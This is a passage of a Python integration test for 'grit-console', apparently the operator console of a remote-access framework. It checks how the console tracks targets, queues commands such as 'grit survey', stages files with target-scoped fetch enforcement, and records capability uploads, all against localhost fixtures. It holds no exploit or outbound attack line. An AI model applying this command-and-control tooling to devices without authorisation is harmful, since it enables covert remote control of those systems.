                "target_registry_state_records_by_selected_target_offline_age_bucket" not in ((filtered_alpha.get("api_collections") or {}).get("target_registry_state_records") or {}).get("indexes", []) or
                "target_registry_state_records_by_selected_target_mailbox_pending_work_count" not in ((filtered_alpha.get("api_collections") or {}).get("target_registry_state_records") or {}).get("indexes", []) or
                "target_registry_state_records_by_selected_target_latest_file_transfer_route_kind" not in ((filtered_alpha.get("api_collections") or {}).get("target_registry_state_records") or {}).get("indexes", []) or
                "target_filter_records_by_filter_reduced_activity" not in ((filtered_alpha.get("api_collections") or {}).get("target_filter_records") or {}).get("indexes", []) or
                "target_filter_records_by_has_filtered_observed_activity" not in ((filtered_alpha.get("api_collections") or {}).get("target_filter_records") or {}).get("indexes", []) or
                (filtered_alpha.get("target_filter_records_by_filter_reduced_activity") or {}).get("True", [{}])[0].get("target_id") != "target-alpha" or
                (filtered_alpha.get("target_filter_records_by_has_filtered_observed_activity") or {}).get("True", [{}])[0].get("target_id") != "target-alpha" or
                ((filtered_alpha.get("targets_by_has_notes") or {}).get("yes") or [{}])[0].get("target_id") != "target-alpha" or
                len((filtered_alpha.get("uploads_by_target_id") or {}).get("target-alpha") or []) != 1 or
                (filtered_alpha.get("uploads_by_target_id") or {}).get("target-bravo")):
            print("target-filtered JSON status did not narrow target records", file=sys.stderr)
            print(json.dumps(filtered_alpha, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        filtered_unknown = json.loads(run(
            "scripts/grit-console",
            "--config", str(upload_cfg),
            "--target-id", "target-missing",
            "--json-status",
        ).stdout)
        unknown_target_warnings = [
            item for item in filtered_unknown.get("warnings", [])
            if item.get("type") == "unknown_target_filter"
        ]
        filtered_unknown_registry = (filtered_unknown.get("target_registry_state_records_by_id") or {}).get("target-registry") or {}
        filtered_unknown_record = (filtered_unknown.get("target_filter_records_by_target_id") or {}).get("target-missing", [{}])[0]
        if (filtered_unknown.get("target_filter", {}).get("target_id") != "target-missing" or
                filtered_unknown.get("target_filter", {}).get("active") is not True or
                filtered_unknown_registry.get("target_count") != 0 or
                filtered_unknown_registry.get("unfiltered_target_count") != 2 or
                filtered_unknown_registry.get("filter_active") is not True or
                filtered_unknown_registry.get("filter_target_id") != "target-missing" or
                filtered_unknown_registry.get("selected_target_found") is not False or
                filtered_unknown_registry.get("has_targets") is not False or
                filtered_unknown_registry.get("has_unfiltered_targets") is not True or
                filtered_unknown.get("target_registry_state_records_by_selected_target_found", {}).get("False", [{}])[0].get("id") != "target-registry" or
                filtered_unknown.get("target_filter", {}).get("selected_target_found") is not False or
                filtered_unknown.get("target_filter", {}).get("selected_target") != {} or
                filtered_unknown.get("target_filter", {}).get("selected_target_label") != "" or
                filtered_unknown.get("api", {}).get("target_filter_selected_target_found") is not False or
                filtered_unknown.get("target_filter", {}).get("unfiltered_counts", {}).get("targets") != 2 or
                filtered_unknown.get("target_filter", {}).get("filtered_counts", {}).get("targets") != 0 or
                filtered_unknown.get("summary", {}).get("target_count") != 0 or
                filtered_unknown.get("summary", {}).get("target_filter_record_count") != 1 or
                filtered_unknown.get("summary", {}).get("target_filter_selected_target_found") is not False or
                filtered_unknown_record.get("selected_target_found") is not False or
                filtered_unknown_record.get("unfiltered_target_count") != 2 or
                filtered_unknown_record.get("filtered_target_count") != 0 or
                filtered_unknown_record.get("filtered_upload_count") != 0 or
                filtered_unknown_record.get("filtered_session_count") != 0 or
                filtered_unknown_record.get("has_unfiltered_activity") is not True or
                filtered_unknown_record.get("has_filtered_activity") is not True or
                filtered_unknown_record.get("filter_reduced_activity") is not True or
                filtered_unknown_record.get("has_unfiltered_observed_activity") is not True or
                filtered_unknown_record.get("has_filtered_observed_activity") is not False or
                filtered_unknown_record.get("filtered_observed_activity_count") != 0 or
                filtered_unknown_record.get("filter_reduced_observed_activity") is not True or
                filtered_unknown.get("target_filter", {}).get("observed_activity_counts", {}).get("has_filtered") is not False or
                filtered_unknown.get("summary", {}).get("target_filter_unfiltered_observed_activity_count") != filtered_unknown_record.get("unfiltered_observed_activity_count") or
                filtered_unknown.get("summary", {}).get("target_filter_observed_activity_count") != 0 or
                filtered_unknown.get("summary", {}).get("target_filter_has_unfiltered_observed_activity") is not True or
                filtered_unknown.get("summary", {}).get("target_filter_has_observed_activity") is not False or
                filtered_unknown.get("summary", {}).get("target_filter_reduced_observed_activity") is not True or
                (filtered_unknown.get("target_filter_records_by_active") or {}).get("True", [{}])[0].get("target_id") != "target-missing" or
                (filtered_unknown.get("target_filter_records_by_has_filtered_activity") or {}).get("True", [{}])[0].get("target_id") != "target-missing" or
                (filtered_unknown.get("target_filter_records_by_has_filtered_observed_activity") or {}).get("False", [{}])[0].get("target_id") != "target-missing" or
                not unknown_target_warnings or
                unknown_target_warnings[-1].get("target_id") != "target-missing" or
                filtered_unknown.get("summary", {}).get("warning_type_counts", {}).get("unknown_target_filter") != 1 or
                "unknown_target_filter" not in ((filtered_unknown.get("warnings_by_type") or {}).keys())):
            print("unknown target-filter status did not expose warning and empty selection", file=sys.stderr)
            print(json.dumps(filtered_unknown, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        filtered_status = run(
            "scripts/grit-console",
            "--config", str(upload_cfg),
            "--target-id", "target-bravo",
            "--status",
        )
        if (filtered_status.returncode != 0 or
                "target_filter: target-bravo targets=1 uploads=1" not in filtered_status.stdout or
                "mailbox_pending=0 poll_overdue=no" not in filtered_status.stdout or
                "offline_for=" not in filtered_status.stdout or
                "offline_age=under-minute" not in filtered_status.stdout or
                "state=online label=Bravo Router confidence=explicit" not in filtered_status.stdout or
                "file_transfer=upload status=ok route=direct" not in filtered_status.stdout or
                "observed=" not in filtered_status.stdout or
                "observed_seen=yes" not in filtered_status.stdout or
                "label=Bravo Router confidence=explicit" not in filtered_status.stdout or
                "target-bravo label=Bravo Router confidence=explicit" not in filtered_status.stdout or
                "notes=primary lab router" in filtered_status.stdout or
                "target-alpha label=Alpha Router Renamed" in filtered_status.stdout):
            print("target-filtered text status did not show selected target only", file=sys.stderr)
            print(filtered_status.stdout, file=sys.stderr)
            return 1
        filtered_workbench = run(
            "scripts/grit-console",
            "--config", str(upload_cfg),
            "--target-id", "target-bravo",
        )
        if (filtered_workbench.returncode != 0 or
                "Target filter: target-bravo targets=1 uploads=1" not in filtered_workbench.stdout or
                "mailbox_pending=0 poll_overdue=no" not in filtered_workbench.stdout or
                "offline_for=" not in filtered_workbench.stdout or
                "offline_age=under-minute" not in filtered_workbench.stdout or
                "state=online label=Bravo Router confidence=explicit" not in filtered_workbench.stdout or
                "observed=" not in filtered_workbench.stdout or
                "observed_seen=yes" not in filtered_workbench.stdout or
                "label=Bravo Router confidence=explicit" not in filtered_workbench.stdout or
                "target-bravo label=Bravo Router confidence=explicit" not in filtered_workbench.stdout or
                "target-alpha label=Alpha Router Renamed" in filtered_workbench.stdout):
            print("target-filtered workbench did not show selected target only", file=sys.stderr)
            print(filtered_workbench.stdout, file=sys.stderr)
            return 1

        target_staged_source = Path(tmp) / "bravo-staged.txt"
        target_staged_source.write_text("target scoped staged file\n", encoding="utf-8")
        target_stage = run(
            "scripts/grit-console",
            "--config", str(upload_cfg),
            "--target-id", "target-bravo",
            "--serve-file", str(target_staged_source),
            "--as", "/tmp/bravo-staged.txt",
            "--list-staged",
        )
        if (target_stage.returncode != 0 or
                "target=target-bravo label=Bravo Router" not in target_stage.stdout or
                "/tmp/bravo-staged.txt" not in target_stage.stdout):
            print("target-scoped staged file was not recorded visibly", file=sys.stderr)
            print(target_stage.stdout, file=sys.stderr)
            return 1
        target_queue = run(
            "scripts/grit-console",
            "--config", str(upload_cfg),
            "--target-id", "target-bravo",
            "--queue-command", "grit survey",
            "--list-command-queue",
        )
        if (target_queue.returncode != 0 or
                "target=target-bravo label=Bravo Router" not in target_queue.stdout or
                "target: target-bravo label=Bravo Router" not in target_queue.stdout):
            print("target-scoped command queue record was not recorded visibly", file=sys.stderr)
            print(target_queue.stdout, file=sys.stderr)
            return 1
        scoped_doc = json.loads(run(
            "scripts/grit-console",
            "--config", str(upload_cfg),
            "--target-id", "target-bravo",
            "--json-status",
        ).stdout)
        scoped_filter_record = (scoped_doc.get("target_filter_records_by_target_id") or {}).get("target-bravo", [{}])[0]
        if (scoped_doc.get("summary", {}).get("staged_count") != 1 or
                scoped_doc.get("summary", {}).get("staged_target_counts", {}).get("target-bravo") != 1 or
                (scoped_doc.get("staged_by_target_id") or {}).get("target-bravo", [{}])[0].get("request_name") != "/tmp/bravo-staged.txt" or
                scoped_doc.get("summary", {}).get("command_queue_total_count") != 1 or
                scoped_doc.get("summary", {}).get("command_queue_target_counts", {}).get("target-bravo") != 1 or
                scoped_doc.get("target_filter", {}).get("unfiltered_counts", {}).get("command_queue_commands") != 1 or
                scoped_doc.get("target_filter", {}).get("filtered_counts", {}).get("command_queue_commands") != 1 or
                scoped_doc.get("summary", {}).get("target_filter_unfiltered_command_queue_command_count") != 1 or
                scoped_doc.get("summary", {}).get("target_filter_command_queue_command_count") != 1 or
                (scoped_doc.get("command_queue") or {}).get("commands_by_target_id", {}).get("target-bravo", [{}])[0].get("command") != "grit survey" or
                scoped_doc.get("summary", {}).get("target_command_target_counts", {}).get("target-bravo", 0) < 1 or
                scoped_doc.get("target_filter", {}).get("unfiltered_counts", {}).get("target_command_records", 0) < scoped_doc.get("target_filter", {}).get("filtered_counts", {}).get("target_command_records", 0) or
                scoped_doc.get("target_filter", {}).get("filtered_counts", {}).get("target_command_records", 0) < 1 or
                scoped_doc.get("summary", {}).get("target_filter_unfiltered_target_command_record_count") != scoped_doc.get("target_filter", {}).get("unfiltered_counts", {}).get("target_command_records") or
                scoped_doc.get("summary", {}).get("target_filter_target_command_record_count") != scoped_doc.get("target_filter", {}).get("filtered_counts", {}).get("target_command_records") or
                scoped_filter_record.get("filtered_staged_count") != 1 or
                scoped_filter_record.get("filtered_command_queue_command_count") != 1 or
                scoped_filter_record.get("filtered_target_command_record_count") != scoped_doc.get("target_filter", {}).get("filtered_counts", {}).get("target_command_records") or
                scoped_filter_record.get("unfiltered_command_queue_command_count") != 1 or
                scoped_filter_record.get("unfiltered_target_command_record_count") != scoped_doc.get("target_filter", {}).get("unfiltered_counts", {}).get("target_command_records") or
                scoped_filter_record.get("has_filtered_activity") is not True or
                scoped_filter_record.get("filtered_observed_activity_count", 0) < 1 or
                scoped_filter_record.get("has_filtered_observed_activity") is not True or
                scoped_doc.get("target_filter", {}).get("observed_activity_counts", {}).get("filtered") != scoped_filter_record.get("filtered_observed_activity_count") or
                scoped_doc.get("summary", {}).get("target_filter_observed_activity_count") != scoped_filter_record.get("filtered_observed_activity_count") or
                scoped_doc.get("summary", {}).get("target_filter_has_observed_activity") is not True or
                not any("--target-id target-bravo" in str(rec.get("command", "")) for rec in scoped_doc.get("target_command_records") or []) or
                not any("--target-label 'Bravo Router'" in str(rec.get("command", "")) for rec in scoped_doc.get("target_command_records") or []) or
                not any("--target-alias lab-bravo" in str(rec.get("command", "")) for rec in scoped_doc.get("target_command_records") or []) or
                not any("--target-id target-bravo --copy-target-command" in str(rec.get("copy_command", "")) for rec in scoped_doc.get("target_command_records") or []) or
                "target_commands_by_target_id" not in ((scoped_doc.get("api_collections") or {}).get("target_command_records") or {}).get("indexes", []) or
                "staged_by_target_id" not in ((scoped_doc.get("api_collections") or {}).get("staged_records") or {}).get("indexes", []) or
                "commands_by_target_id" not in ((scoped_doc.get("api_collections") or {}).get("command_queue_commands") or {}).get("indexes", [])):
            print("target-scoped staged/queue records missing from JSON/API status", file=sys.stderr)
            print(json.dumps(scoped_doc, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        target_fetch_proc = subprocess.Popen(
            [
                str(server),
                "--config", str(upload_cfg),
                "--file-service",
                "--file-service-tls", "no",
                "--one-shot",
                "--timeout", "5",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        wrong_target_request = (
            "GET /fetch?name=%2Ftmp%2Fbravo-staged.txt HTTP/1.1\r\n"
            "Host: 127.0.0.1\r\n"
            "X-Grit-Target-Id: target-alpha\r\n"
            "\r\n"
        ).encode("ascii")
        wrong_target_response = connect_with_retry(upload_port, wrong_target_request)
        wrong_stdout, wrong_stderr = target_fetch_proc.communicate(timeout=5)
        if target_fetch_proc.returncode != 0:
            print("target-scoped staged fetch mismatch server exited nonzero:", file=sys.stderr)
            print(wrong_stdout, file=sys.stderr)
            print(wrong_stderr, file=sys.stderr)
            return 1
        if (b"HTTP/1.1 403 Forbidden" not in wrong_target_response or
                b"target mismatch" not in wrong_target_response or
                b"target scoped staged file" in wrong_target_response):
            print("target-scoped staged fetch mismatch was not rejected", file=sys.stderr)
            print(wrong_target_response.decode("utf-8", errors="replace"), file=sys.stderr)
            return 1
        target_fetch_proc = subprocess.Popen(
            [
                str(server),
                "--config", str(upload_cfg),
                "--file-service",
                "--file-service-tls", "no",
                "--one-shot",
                "--timeout", "5",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        matching_target_request = (
            "GET /fetch?name=%2Ftmp%2Fbravo-staged.txt HTTP/1.1\r\n"
            "Host: 127.0.0.1\r\n"
            "X-Grit-Target-Id: target-bravo\r\n"
            "X-Grit-Target-Label: Bravo Router\r\n"
            "X-Grit-Target-Alias: lab-bravo\r\n"
            "\r\n"
        ).encode("ascii")
        matching_target_response = connect_with_retry(upload_port, matching_target_request)
        match_stdout, match_stderr = target_fetch_proc.communicate(timeout=5)
        if target_fetch_proc.returncode != 0:
            print("target-scoped staged fetch match server exited nonzero:", file=sys.stderr)
            print(match_stdout, file=sys.stderr)
            print(match_stderr, file=sys.stderr)
            return 1
        if (b"HTTP/1.1 200 OK" not in matching_target_response or
                not matching_target_response.endswith(b"target scoped staged file\n")):
            print("target-scoped staged fetch match was not served", file=sys.stderr)
            print(matching_target_response.decode("utf-8", errors="replace"), file=sys.stderr)
            return 1
        target_fetch_docs = [
            json.loads(path.read_text(encoding="utf-8"))
            for path in session_root.glob("*/session.json")
        ]
        served_target_fetches = [
            fetch
            for doc in target_fetch_docs
            for fetch in doc.get("fetches") or []
            if fetch.get("request_name") == "/tmp/bravo-staged.txt" and fetch.get("status") == "served"
        ]
        rejected_target_fetches = [
            fetch
            for doc in target_fetch_docs
            for fetch in doc.get("fetches") or []
            if fetch.get("request_name") == "/tmp/bravo-staged.txt" and fetch.get("status") == "rejected"
        ]
        if (not served_target_fetches or
                served_target_fetches[-1].get("target_id") != "target-bravo" or
                served_target_fetches[-1].get("target_label") != "Bravo Router" or
                "lab-bravo" not in (served_target_fetches[-1].get("target_aliases") or []) or
                not rejected_target_fetches or
                rejected_target_fetches[-1].get("http_status") != 403 or
                rejected_target_fetches[-1].get("expected_target_id") != "target-bravo"):
            print("target-scoped staged fetch session metadata missing target enforcement details", file=sys.stderr)
            print(json.dumps(target_fetch_docs, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        all_fetch_status = json.loads(run(
            "scripts/grit-console",
            "--config", str(upload_cfg),
            "--json-status",
        ).stdout)
        all_fetch_events_api = (all_fetch_status.get("api_collections") or {}).get("events") or {}
        if (all_fetch_status.get("summary", {}).get("event_detail_expected_target_id_counts", {}).get("target-bravo", 0) < 1 or
                all_fetch_status.get("event_log_stats", {}).get("by_detail_expected_target_id", {}).get("target-bravo", 0) < 1 or
                (all_fetch_status.get("events_by_detail_expected_target_id") or {}).get("target-bravo", [{}])[-1].get("details", {}).get("status") != "rejected" or
                (all_fetch_status.get("events_by_event_detail_expected_target_id") or {}).get("fetch_complete:target-bravo", [{}])[-1].get("details", {}).get("target_id") != "target-alpha" or
                (all_fetch_status.get("events_by_service_detail_expected_target_id") or {}).get("file-service:target-bravo", [{}])[-1].get("details", {}).get("reason") != "target mismatch" or
                "events_by_detail_expected_target_id" not in (all_fetch_events_api.get("indexes") or []) or
                "events_by_event_detail_expected_target_id" not in (all_fetch_events_api.get("indexes") or []) or
                "events_by_service_detail_expected_target_id" not in (all_fetch_events_api.get("indexes") or [])):
            print("target-scoped staged fetch missing expected-target event indexes", file=sys.stderr)
            print(json.dumps(all_fetch_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        scoped_fetch_status = json.loads(run(
            "scripts/grit-console",
            "--config", str(upload_cfg),
            "--target-id", "target-bravo",
            "--json-status",
        ).stdout)
        if (scoped_fetch_status.get("summary", {}).get("fetch_target_counts", {}).get("target-bravo") != 1 or
                (scoped_fetch_status.get("fetches_by_target_id") or {}).get("target-bravo", [{}])[0].get("request_name") != "/tmp/bravo-staged.txt"):
            print("target-scoped staged fetch not reflected in target-filtered status", file=sys.stderr)
            print(json.dumps(scoped_fetch_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1

        capability_port = free_port()
        capability_operator_dir = Path(tmp) / "operator-session-capability-target"
        capability_cfg = Path(tmp) / "server-config-capability-target.json"
        capability_cfg.write_text(json.dumps({
            "GRIT_OPERATOR_FILE_SERVICE_ENABLE": "yes",
            "listen_host": "127.0.0.1",
            "GRIT_OPERATOR_FILE_SERVICE_PORT": capability_port,
            "session_root": str(Path(tmp) / "sessions-capability-target"),
            "operator_session_dir": str(capability_operator_dir),
            "server_state": str(capability_operator_dir / "server-state.json"),
            "staged_files": str(capability_operator_dir / "staged-files.json"),
            "tls_cert": str(cert_path),
            "tls_key": str(key_path),
        }), encoding="utf-8")
        capability_proc = subprocess.Popen(
            [
                str(server),
                "--config", str(capability_cfg),
                "--file-service",
                "--one-shot",
                "--timeout", "5",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        capability_payload = json.dumps({
            "schema": 1,
            "checks": [
                {"name": "runtime_root_writable", "type": "capability", "status": "pass", "ok": True, "available": True, "skipped": False},
                {"name": "pty", "type": "capability", "status": "fail", "ok": False, "available": False, "skipped": False},
                {"name": "operator_upload", "type": "operator", "status": "skipped", "ok": False, "skipped": True},
            ],
            "summary": {
                "check_count": 3,
                "pass": 1,
                "fail": 1,
                "skipped": 1,
                "capability_pass": 1,
                "capability_fail": 1,
                "operator_pass": 0,
                "operator_fail": 0,
                "operator_skipped": 1,
                "constraints": {
                    "tmp_noexec": False,
                    "rootfs_read_only": True,
                    "procfs_partial": False,
                },
            },
            "selected": {
                "release_name": "operator-smoke",
                "artifact": "bin/grit-test",
                "tuple_path": "by-tuple/native/host/host/host",
                "payload_preset": "survey-core",
                "compatibility": {"label": "exact", "reasons": ["fixture baseline"]},
                "effective_compatibility": {
                    "label": "unsafe",
                    "baseline_label": "exact",
                    "source": "release-index+reality",
                    "reasons": ["runtime root execution failed in reality-test"],
                },
            },
        }, sort_keys=True).encode("utf-8")
        capability_request = (
            "PUT /upload/reality-test.json HTTP/1.1\r\n"
            "Host: 127.0.0.1\r\n"
            "X-Grit-Source-Path: /tmp/reality-test.json\r\n"
            "X-Grit-Upload-Kind: reality-test\r\n"
            "X-Grit-Target-Id: target-capability\r\n"
            "X-Grit-Target-Label: Capability Router\r\n"
            f"Content-Length: {len(capability_payload)}\r\n"
            "\r\n"
        ).encode("ascii") + capability_payload
        capability_response = b""
        deadline = time.time() + 5
        while time.time() < deadline:
            try:
                with socket.create_connection(("127.0.0.1", capability_port), timeout=0.5) as raw:
                    with context.wrap_socket(raw, server_hostname="grit") as tls:
                        tls.sendall(capability_request)
                        while True:
                            chunk = tls.recv(65536)
                            if not chunk:
                                break
                            capability_response += chunk
                break
            except (ConnectionRefusedError, TimeoutError, OSError):
                time.sleep(0.05)
        capability_stdout, capability_stderr = capability_proc.communicate(timeout=5)
        if capability_proc.returncode != 0 or b"HTTP/1.1 200 OK" not in capability_response:
            print("capability report target upload failed", file=sys.stderr)
            print(capability_response.decode("utf-8", errors="replace"), file=sys.stderr)
            print(capability_stdout, file=sys.stderr)
            print(capability_stderr, file=sys.stderr)
            return 1
        capability_status = json.loads(run(
            "scripts/grit-console",
            "--config", str(capability_cfg),
            "--target-id", "target-capability",
            "--json-status",
        ).stdout)
        capability_target = (capability_status.get("targets_by_id") or {}).get("target-capability") or {}
        capability_summary = capability_target.get("latest_capability_summary") or {}
        target_compatibility = capability_target.get("latest_compatibility_summary") or {}
        capability_status_summary = capability_status.get("summary") or {}
        capability_api_indexes = (((capability_status.get("api_collections") or {}).get("targets") or {}).get("indexes") or [])
        capability_filter = capability_status.get("target_filter") or {}
        capability_filter_record = (capability_status.get("target_filter_records_by_target_id") or {}).get("target-capability", [{}])[0]
        capability_registry_record = (capability_status.get("target_registry_state_records_by_id") or {}).get("target-registry") or {}
        if (capability_target.get("latest_capability_report_kind") != "reality-test" or
                not capability_target.get("latest_capability_report_path", "").endswith("reality-test.json") or
                capability_target.get("latest_compatibility_report_kind") != "reality-test" or
                capability_target.get("latest_compatibility_label") != "unsafe" or
                capability_target.get("latest_compatibility_baseline_label") != "exact" or
                capability_target.get("latest_compatibility_release_name") != "operator-smoke" or
                capability_target.get("latest_compatibility_payload_preset") != "survey-core" or
                target_compatibility.get("reason_count") != 1 or
                capability_summary.get("check_count") != 3 or
                capability_summary.get("capability_pass_count") != 1 or
                capability_summary.get("capability_fail_count") != 1 or
                "runtime_root_writable" not in (capability_target.get("observed_capabilities") or []) or
                "pty" not in (capability_target.get("observed_missing_capabilities") or []) or
                capability_target.get("observed_constraints", {}).get("rootfs_read_only") is not True or
                capability_status_summary.get("target_capability_report_count") != 1 or
                capability_status_summary.get("target_capability_report_kind_counts", {}).get("reality-test") != 1 or
                capability_status_summary.get("target_compatibility_report_count") != 1 or
                capability_status_summary.get("target_compatibility_report_kind_counts", {}).get("reality-test") != 1 or
                capability_status_summary.get("target_compatibility_label_counts", {}).get("unsafe") != 1 or
                capability_status_summary.get("target_compatibility_baseline_label_counts", {}).get("exact") != 1 or
                capability_status_summary.get("target_compatibility_release_counts", {}).get("operator-smoke") != 1 or
                capability_status_summary.get("target_compatibility_payload_preset_counts", {}).get("survey-core") != 1 or
                capability_registry_record.get("compatibility_report_count") != 1 or
                capability_registry_record.get("compatibility_label_counts", {}).get("unsafe") != 1 or
                capability_registry_record.get("compatibility_release_counts", {}).get("operator-smoke") != 1 or
                capability_registry_record.get("selected_target_latest_capability_report_kind") != "reality-test" or
                capability_registry_record.get("selected_target_latest_capability_check_count") != 3 or
                capability_registry_record.get("selected_target_latest_compatibility_label") != "unsafe" or
                capability_registry_record.get("selected_target_latest_compatibility_release_name") != "operator-smoke" or
                capability_filter.get("selected_target_latest_capability_report_kind") != "reality-test" or
                capability_filter.get("selected_target_latest_capability_check_count") != 3 or
                capability_filter.get("selected_target_latest_capability_pass_count") != 1 or
                capability_filter.get("selected_target_latest_capability_fail_count") != 1 or
                capability_filter.get("selected_target_latest_compatibility_report_kind") != "reality-test" or
                capability_filter.get("selected_target_latest_compatibility_label") != "unsafe" or
                capability_filter.get("selected_target_latest_compatibility_baseline_label") != "exact" or
                capability_filter.get("selected_target_latest_compatibility_release_name") != "operator-smoke" or
                capability_filter.get("selected_target_latest_compatibility_payload_preset") != "survey-core" or
                capability_filter.get("selected_target_latest_compatibility_reason_count") != 1 or
                capability_filter_record.get("selected_target_latest_capability_report_kind") != "reality-test" or
                capability_filter_record.get("selected_target_latest_capability_check_count") != 3 or
                capability_filter_record.get("selected_target_latest_compatibility_label") != "unsafe" or
                capability_filter_record.get("selected_target_latest_compatibility_release_name") != "operator-smoke" or
                capability_status.get("api", {}).get("target_filter_selected_target_latest_capability_report_kind") != "reality-test" or
                capability_status.get("api", {}).get("target_filter_selected_target_latest_compatibility_label") != "unsafe" or
                capability_status.get("target_filter_records_by_selected_target_latest_compatibility_label", {}).get("unsafe", [{}])[0].get("target_id") != "target-capability" or
                capability_status.get("target_registry_state_records_by_selected_target_latest_compatibility_label", {}).get("unsafe", [{}])[0].get("id") != "target-registry" or
                capability_status_summary.get("target_observed_capability_counts", {}).get("runtime_root_writable") != 1 or
                capability_status_summary.get("target_missing_capability_counts", {}).get("pty") != 1 or
                capability_status_summary.get("target_observed_constraint_counts", {}).get("rootfs_read_only:true") != 1 or
                ((capability_status.get("targets_by_capability_report_kind") or {}).get("reality-test") or [{}])[0].get("target_id") != "target-capability" or
                ((capability_status.get("targets_by_compatibility_report_kind") or {}).get("reality-test") or [{}])[0].get("target_id") != "target-capability" or
                ((capability_status.get("targets_by_compatibility_label") or {}).get("unsafe") or [{}])[0].get("target_id") != "target-capability" or
                ((capability_status.get("targets_by_compatibility_baseline_label") or {}).get("exact") or [{}])[0].get("target_id") != "target-capability" or
                ((capability_status.get("targets_by_compatibility_release") or {}).get("operator-smoke") or [{}])[0].get("target_id") != "target-capability" or
                ((capability_status.get("targets_by_compatibility_payload_preset") or {}).get("survey-core") or [{}])[0].get("target_id") != "target-capability" or
                ((capability_status.get("targets_by_observed_capability") or {}).get("runtime_root_writable") or [{}])[0].get("target_id") != "target-capability" or
                ((capability_status.get("targets_by_missing_capability") or {}).get("pty") or [{}])[0].get("target_id") != "target-capability" or
                ((capability_status.get("targets_by_observed_constraint") or {}).get("rootfs_read_only:true") or [{}])[0].get("target_id") != "target-capability" or
                "targets_by_capability_report_kind" not in capability_api_indexes or
                "targets_by_compatibility_report_kind" not in capability_api_indexes or
                "targets_by_compatibility_label" not in capability_api_indexes or
                "targets_by_compatibility_baseline_label" not in capability_api_indexes or
                "targets_by_compatibility_release" not in capability_api_indexes or
                "targets_by_compatibility_payload_preset" not in capability_api_indexes or
                "targets_by_observed_capability" not in capability_api_indexes or
                "targets_by_missing_capability" not in capability_api_indexes or
                "targets_by_observed_constraint" not in capability_api_indexes or
                "target_filter_records_by_selected_target_latest_compatibility_label" not in ((capability_status.get("api_collections") or {}).get("target_filter_records") or {}).get("indexes", []) or
                "target_registry_state_records_by_selected_target_latest_compatibility_label" not in ((capability_status.get("api_collections") or {}).get("target_registry_state_records") or {}).get("indexes", [])):
            print("target capability report upload did not update observed capabilities", file=sys.stderr)
            print(json.dumps(capability_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        capability_text_status = run(
            "scripts/grit-console",
            "--config", str(capability_cfg),
            "--target-id", "target-capability",
            "--status",
        )
        if (capability_text_status.returncode != 0 or
                "target_filter: target-capability targets=1 uploads=1" not in capability_text_status.stdout or
                "selected_target_capability=reality-test checks=3 pass=1 fail=1" not in capability_text_status.stdout or
                "selected_target_compatibility=reality-test label=unsafe baseline=exact release=operator-smoke payload=survey-core reasons=1" not in capability_text_status.stdout):
            print("target-filtered text status did not show selected target evidence", file=sys.stderr)
            print(capability_text_status.stdout, file=sys.stderr)
            return 1
        capability_workbench = run(
            "scripts/grit-console",
            "--config", str(capability_cfg),
            "--target-id", "target-capability",
        )
        if (capability_workbench.returncode != 0 or
                "Target filter: target-capability targets=1 uploads=1" not in capability_workbench.stdout or
                "selected_target_capability=reality-test checks=3 pass=1 fail=1" not in capability_workbench.stdout or
                "selected_target_compatibility=reality-test label=unsafe baseline=exact release=operator-smoke payload=survey-core reasons=1" not in capability_workbench.stdout):
            print("target-filtered workbench did not show selected target evidence", file=sys.stderr)
            print(capability_workbench.stdout, file=sys.stderr)
            return 1

        line_sigint_state = Path(tmp) / "operator-session" / "line-sigint-state.json"
        line_master, line_slave = pty.openpty()
        try:
            line_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(upload_cfg),
                    "--state-file", str(line_sigint_state),
                    "--staged-file", str(staged_file),
                ],
                cwd=ROOT,
                stdin=line_slave,
                stdout=line_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "xterm"},
            )
            os.close(line_slave)
            line_slave = -1
            time.sleep(0.5)
            line_proc.send_signal(signal.SIGINT)
            _line_stdout, line_stderr = line_proc.communicate(timeout=5)
        finally:
            if line_slave != -1:
                os.close(line_slave)
            try:
                os.close(line_master)
            except OSError:
                pass
        if line_proc.returncode not in (0, 130) or "Traceback" in (line_stderr or ""):
            print("interactive console SIGINT did not exit cleanly", file=sys.stderr)
            print(line_stderr or "", file=sys.stderr)
            return 1
        line_sigint_doc = json.loads(line_sigint_state.read_text(encoding="utf-8"))
        if line_sigint_doc.get("services", {}).get("workbench", {}).get("status") != "stopped":
            print("interactive console SIGINT did not mark workbench stopped", file=sys.stderr)
            print(json.dumps(line_sigint_doc, indent=2), file=sys.stderr)
            return 1
        if line_sigint_doc.get("services", {}).get("workbench", {}).get("workbench_mode") != "line":
            print("interactive console SIGINT did not preserve line workbench mode", file=sys.stderr)
            print(json.dumps(line_sigint_doc, indent=2), file=sys.stderr)
            return 1

        dumb_line_state = Path(tmp) / "operator-session" / "line-dumb-state.json"
        dumb_master, dumb_slave = pty.openpty()
        try:
            dumb_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(upload_cfg),
                    "--state-file", str(dumb_line_state),
                    "--staged-file", str(staged_file),
                ],
                cwd=ROOT,
                stdin=dumb_slave,
                stdout=dumb_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(dumb_slave)
            dumb_slave = -1
            time.sleep(0.3)
            os.write(dumb_master, b"q\n")
            _dumb_stdout, dumb_stderr = dumb_proc.communicate(timeout=5)
        finally:
            if dumb_slave != -1:
                os.close(dumb_slave)
            try:
                os.close(dumb_master)
            except OSError:
                pass
        if dumb_proc.returncode != 0 or "Traceback" in (dumb_stderr or ""):
            print("TERM=dumb line-oriented console fallback did not exit cleanly", file=sys.stderr)
            print(dumb_stderr or "", file=sys.stderr)
            return 1
        dumb_line_doc = json.loads(dumb_line_state.read_text(encoding="utf-8"))
        if dumb_line_doc.get("services", {}).get("workbench", {}).get("status") != "stopped":
            print("TERM=dumb line-oriented console fallback did not mark workbench stopped", file=sys.stderr)
